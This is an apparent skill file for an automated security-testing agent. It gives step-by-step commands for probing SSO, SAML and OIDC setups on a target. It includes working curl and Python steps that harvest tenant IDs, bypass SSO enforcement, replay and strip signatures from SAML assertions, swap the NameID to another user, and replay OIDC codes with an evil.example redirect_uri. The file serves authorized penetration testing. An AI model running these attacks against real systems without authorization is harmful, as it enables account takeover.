---
name: sso_config_leak
agent: agent4_auth
description: Discover SSO/SAML/OIDC metadata endpoints leaking tenant IDs, client IDs, and IdP config; test unsolicited-response acceptance and SSO-enforcement gaps.
---

# SSO Config Leak

## Purpose

Single sign-on integrations leak their own blueprints: `/.well-known/openid-configuration` documents publish client IDs, token endpoints, and JWKS URLs; `/saml/metadata` exposes entity IDs, ACS URLs, and signing certificates; JavaScript bundles hardcode Okta/Auth0/Cognito tenant domains. Worse, some service providers accept unsolicited SAML responses or let SSO-mandated users fall back to password login. This skill discovers every SSO/SAML/OIDC surface on the target, mines it for tenant and client identifiers plus internal hostnames, and tests the two high-impact logic flaws: unsolicited-response acceptance and SSO-enforcement bypass. A leaked tenant ID plus an enforcement gap is an account-takeover chain.

## Division of labor

- **Consumes:** the target's endpoint list (from endpoint discovery), any JS bundle URLs, a test account with and without SSO enabled if available
- **Produces:** the finished artifact — `findings/sso_config_leak_confirmed.md` with the endpoint inventory, harvested identifiers table, and raw pairs for every CONFIRMED leak or logic flaw

## When to use / when NOT to use

- **Use when:** the target shows any SSO surface — "Sign in with SSO", "Continue with Okta/Google/Microsoft", `/.well-known/*` endpoints, SAML/OIDC keywords in JS or HTML, or an `/adfs`, `/saml`, `/oauth` path
- **Skip when (time-pass filter):** no SSO surface exists anywhere (no keywords, no endpoints, no login options — does it leak? nothing to leak. is it sensitive? n/a). If the metadata endpoints exist but expose only public, standard discovery data with no tenant/client identifiers and no logic flaw, record NEGATIVE with the fetched documents attached — don't re-mine the same JSON hoping for secrets.

## Methodology

1. Sweep the standard SSO/SAML/OIDC metadata paths on the target and record status + size for each; compare against the known-dead path baseline. Paths: `/.well-known/openid-configuration`, `/.well-known/jwks.json`, `/saml/metadata`, `/saml2/metadata`, `/metadata`, `/adfs/ls/idpinitiatedsignon.aspx`, `/oauth/.well-known/openid-configuration`, `/auth/.well-known/openid-configuration`, `/.well-known/saml-configuration`, `/sso/metadata`, `/shibboleth`.
2. For every 200 response, save the document and mine it: `client_id`(s), tenant IDs, `issuer` / `entityID`, authorization/token/userinfo/JWKS endpoint URLs, `redirect_uris`, signing certificates (decode the X.509 — read subject, issuer, expiry, SANs), and any non-public hostnames in endpoint URLs.
3. Discover IdP-initiated / unsolicited SSO entry points: `POST` targets named `acs`, `sso`, `saml/consume`, `assertionconsumer`, plus any endpoint the metadata's `AssertionConsumerService` points to. Record which bindings (POST/Redirect) each ACS advertises.
4. Harvest JS for SSO config: pull the app's JS bundles and grep for tenant names, Okta/Auth0/Cognito domain names (`*.okta.com`, `*.auth0.com`, `*.amazoncognito.com`), Azure AD tenant GUIDs, SAML ACS URLs, `client_id` literals, and IdP entity IDs. Deduplicate and add any new hostnames to the recon target list.
5. Map the login-option logic: with an SSO-enabled test user, attempt direct password login (bypassing the SSO button — POST to the password endpoint directly). If password auth succeeds for a user flagged SSO-only, SSO enforcement is bypassable — CONFIRMED logic flaw. Also test whether the SSO identifier field (email/domain) is validated: does entering a non-SSO domain still route to SSO, and vice versa?
6. Test unsolicited-response acceptance: capture a genuine `SAMLResponse` from a real login flow (decode the base64, note `Destination`, `InResponseTo`, `NotBefore`/`NotOnOrAfter`, signature). Then replay it to the ACS a second time — acceptance of a replayed assertion = missing `InResponseTo`/replay protection. This is the gate for step 7.
7. If replay is accepted, escalate the tamper ladder on a COPY of the assertion (single-variable changes): (a) strip the signature entirely; (b) modify the `NameID`/email to another user; (c) extend `NotOnOrAfter` far into the future; (d) change `Destination`/`Audience`. Each accepted tamper is a distinct CONFIRMED finding — unsigned-assertion acceptance is the jackpot.
8. Test OIDC-side gaps: take the authorization `code` from a real flow and replay it at the token endpoint twice (missing single-use = code replay); swap the `redirect_uri` to an unlisted value; drop the `state` parameter and see if the flow completes (CSRF-able login).
9. Check for tenant-enumeration oracles: does the SSO discovery endpoint (`/sso/lookup?domain=` style) distinguish valid vs invalid tenant domains by status/size/timing? A differential here feeds subdomain/tenant enumeration.
10. Verdict everything: CONFIRMED only with baseline + 2x repro + raw pairs; INCONCLUSIVE when you need a second identity, a captured assertion you couldn't obtain, or human judgment; NEGATIVE for dead ends with the documents attached so nobody re-fetches them.

## Exact commands

Baseline (known-dead path control):

```bash
BASE="https://<TARGET>"
DEAD="/this-path-is-dead-9f3k2"
curl -sk -o /dev/null -w "dead-path: %{http_code} %{size_download}\n" "$BASE$DEAD"
```

Metadata endpoint sweep — status + size for each candidate:

```bash
for p in /.well-known/openid-configuration /.well-known/jwks.json /saml/metadata /saml2/metadata /metadata /adfs/ls/idpinitiatedsignon.aspx /oauth/.well-known/openid-configuration /auth/.well-known/openid-configuration /.well-known/saml-configuration /sso/metadata /shibboleth; do
  printf "%-55s -> " "$p"; curl -sk -o "/tmp/meta_$(echo "$p" | tr '/.' '__').txt" -w "%{http_code} %{size_download}\n" "$BASE$p"
done
ls -la /tmp/meta_*.txt
```

Mine a discovery document for identifiers and internal hostnames:

```bash
F=/tmp/meta___well-known_openid-configuration.txt
python3 - "$F" <<'EOF'
import json, re, sys
doc = open(sys.argv[1]).read()
try:
    j = json.loads(doc)
    print("issuer:", j.get("issuer"))
    for k in ("authorization_endpoint", "token_endpoint", "userinfo_endpoint", "jwks_uri", "registration_endpoint"):
        print(k, "=>", j.get(k))
except Exception as e:
    print("not JSON:", e)
print("== hostnames =="); print("\n".join(sorted(set(re.findall(r'https?://([A-Za-z0-9_.-]+)', doc)))))
print("== client_id/tenant-ish literals =="); print("\n".join(sorted(set(re.findall(r'(?i)(?:client_id|tenant|tenantId)["\s:=]+([A-Za-z0-9_.-]{4,80})', doc)))))
EOF
```

Decode a SAML metadata signing certificate:

```bash
python3 - /tmp/meta__saml_metadata.txt <<'EOF'
import base64, re, sys, subprocess
doc = open(sys.argv[1]).read()
certs = re.findall(r'<ds:X509Certificate>([^<]+)</ds:X509Certificate>', doc)
print("certs found:", len(certs))
for i, c in enumerate(certs):
    open(f"/tmp/samlcert{i}.pem", "w").write("-----BEGIN CERTIFICATE-----\n" + c.strip() + "\n-----END CERTIFICATE-----\n")
    out = subprocess.run(["openssl", "x509", "-in", f"/tmp/samlcert{i}.pem", "-noout", "-subject", "-issuer", "-enddate", "-ext", "subjectAltName"],
                         capture_output=True, text=True)
    print(f"--- cert {i} ---"); print(out.stdout, out.stderr)
EOF
```

Harvest JS bundles for SSO config (tenant domains, client IDs, ACS URLs):

```bash
curl -sk "$BASE/" -o /tmp/home.html
grep -oiE 'src="[^"]+\.js[^"]*"' /tmp/home.html | sed 's/src="//;s/"//' | head -20 > /tmp/jslist.txt
cat /tmp/jslist.txt
while read -r j; do
  case "$j" in http*) U="$j";; /*) U="$BASE$j";; *) U="$BASE/$j";; esac
  curl -sk "$U" 2>/dev/null
done < /tmp/jslist.txt > /tmp/all.js
grep -oiE '[a-z0-9.-]+\.(okta\.com|auth0\.com|amazoncognito\.com|onmicrosoft\.com|oktapreview\.com)' /tmp/all.js | sort -u
grep -oiE '(saml|oauth|openid|tenant|client_id|entityid|acs)[^"'"'"'<> ]{0,100}' /tmp/all.js | sort -u | head -40
```

SSO-enforcement gap — direct password login for an SSO-flagged user (bypass the SSO button):

```bash
curl -sk -c /tmp/sso_bypass.txt -X POST "$BASE/login" \
  --data-urlencode "username=<SSO_USER_EMAIL>" --data-urlencode "password=<SSO_USER_PASSWORD>" \
  -D /tmp/sso_bypass.h -o /dev/null -w "direct-password-login HTTP:%{http_code}\n"
printf "authenticated after bypass? -> "; curl -sk -b /tmp/sso_bypass.txt -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE/api/me"
```

SAMLResponse replay — decode, inspect, replay to the ACS twice:

```bash
SAML='<BASE64_SAMLResponse_CAPTURED_FROM_REAL_LOGIN>'
python3 - "$SAML" <<'EOF'
import base64, sys, re
xml = base64.b64decode(sys.argv[1]).decode("utf-8", "replace")
open("/tmp/assertion.xml", "w").write(xml)
for pat in (r'Destination="([^"]+)"', r'InResponseTo="([^"]+)"', r'NotOnOrAfter="([^"]+)"', r'<saml2?:NameID[^>]*>([^<]+)<'):
    m = re.search(pat, xml); print(pat[:24], "=>", m.group(1) if m else "ABSENT")
EOF
ACS="$BASE/saml/acs"
for i in 1 2; do printf "replay try $i -> "; curl -sk -c /tmp/saml$i.txt -X POST "$ACS" --data-urlencode "SAMLResponse=$SAML" --data-urlencode "RelayState=/" -D /tmp/saml$i.h -o /dev/null -w "%{http_code}\n"; done
printf "session from replay 1 -> "; curl -sk -b /tmp/saml1.txt -o /dev/null -w "%{http_code} %{size_download}\n" "$BASE/api/me"
```

Unsigned-assertion tamper (only if replay was accepted — single-variable escalation):

```bash
python3 <<'EOF'
import base64, re
xml = open("/tmp/assertion.xml").read()
stripped = re.sub(r'<ds:Signature>.*?</ds:Signature>', '', xml, flags=re.S)
open("/tmp/unsigned.b64", "w").write(base64.b64encode(stripped.encode()).decode())
swapped = re.sub(r'(<saml2?:NameID[^>]*>)[^<]+(<)', r'\1victim@example.com\2', stripped)
open("/tmp/swapped.b64", "w").write(base64.b64encode(swapped.encode()).decode())
print("wrote /tmp/unsigned.b64 and /tmp/swapped.b64")
EOF
for f in unsigned swapped; do
  printf "$f -> "; curl -sk -X POST "$ACS" --data-urlencode "SAMLResponse=$(cat /tmp/$f.b64)" -o /dev/null -w "%{http_code} %{size_download}\n"
done
```

OIDC code replay + redirect_uri swap:

```bash
CODE="<AUTHORIZATION_CODE_FROM_REAL_FLOW>"
for i in 1 2; do printf "code replay try $i -> "; curl -sk -X POST "$BASE/oauth/token" --data-urlencode "grant_type=authorization_code" --data-urlencode "code=$CODE" --data-urlencode "redirect_uri=<REGISTERED_URI>" --data-urlencode "client_id=<CLIENT_ID>" -o /dev/null -w "%{http_code} %{size_download}\n"; done
printf "unlisted redirect_uri -> "; curl -sk -X POST "$BASE/oauth/token" --data-urlencode "grant_type=authorization_code" --data-urlencode "code=$CODE" --data-urlencode "redirect_uri=https://evil.example/" --data-urlencode "client_id=<CLIENT_ID>" -o /dev/null -w "%{http_code} %{size_download}\n"
```

Tenant-enumeration oracle check:

```bash
for d in valid-tenant.example invalid-tenant-zzz.example; do
  printf "domain=$d -> "; curl -sk -o /dev/null -w "%{http_code} %{size_download} %{time_total}s\n" "$BASE/sso/lookup?domain=$d"
done
```

## Completion-bias defenses

- [ ] Metadata sweep run on all 11 candidate paths; status + size recorded vs dead-path baseline
- [ ] Every 200 document saved and mined (client IDs, tenant IDs, entity IDs, endpoint URLs, certs decoded)
- [ ] ACS / unsolicited-response entry points identified with bindings
- [ ] JS bundles harvested and grepped for SSO config (tenant domains, client IDs, ACS URLs)
- [ ] SSO-enforcement gap tested (direct password login for SSO user)
- [ ] SSO identifier/domain routing validated
- [ ] Genuine SAMLResponse captured, decoded, and inspected
- [ ] Assertion replay tested 2x at the ACS
- [ ] Tamper ladder attempted only if replay accepted (unsigned, NameID swap, expiry extension, Destination change)
- [ ] OIDC gaps tested (code replay 2x, redirect_uri swap, state drop)
- [ ] Tenant-enumeration oracle checked
- [ ] Every item has a verdict: CONFIRMED / INCONCLUSIVE / NEGATIVE
- **Review step:** agent10_review must verify (1) `findings/sso_config_leak_confirmed.md` exists with the endpoint inventory and identifiers table, (2) every CONFIRMED leak shows the raw fetched document excerpt, (3) unsolicited-response/tamper claims include two independent reproductions with the exact SAMLResponse used (redacted signature), (4) SSO-bypass claims prove an authenticated session resulted (not just a 200).
- **Nudge prompts:** "Keep going until you have mined every 200 document and every JS bundle, not just the first openid-configuration that responded." / "Do not report done before the finished artifact exists on disk." / "A metadata document that only contains standard public discovery fields is NEGATIVE — attach it and move on, don't re-mine it."
- **Finished artifact definition:** `findings/sso_config_leak_confirmed.md` — endpoint inventory table (path | status | size | verdict), harvested identifiers table (type | value-redacted | source), and raw request/response pairs for every CONFIRMED leak or logic flaw.

## Evidence standard

- Baseline: every endpoint compared against the known-dead path on the same host — a 200 on `/saml/metadata` means nothing if the dead path also 200s (SPA fallback)
- Reproduction: 2x independent reproduction required (replays and bypasses run twice; fresh assertion capture between runs where possible)
- Raw evidence: full request/response pairs saved (metadata excerpts, SAMLResponse redacted to structure + first 60 chars, response status/headers/body proving authenticated session)
- Verdicts: CONFIRMED (baseline + 2x repro + raw pairs) / INCONCLUSIVE (needs a second identity, an unobtainable captured assertion, or human — state exactly what) / NEGATIVE (dead end, documents attached so nobody re-fetches them)

## Handoffs

- `jwt_edge_cases`: receives harvested JWKS URLs, signing certificates, and any ID-token samples for the token attack ladder
- `session_fixation`: receives SSO-session observations (does SSO login rotate the app session? does single-logout kill it?)
- `role_oracle`: receives any role/group claims found in assertions or metadata for differential testing
- Endpoint discovery / recon: receives every new internal hostname and tenant domain found in metadata and JS
- agent10_review: consumes `findings/sso_config_leak_confirmed.md` as the shippable evidence bundle
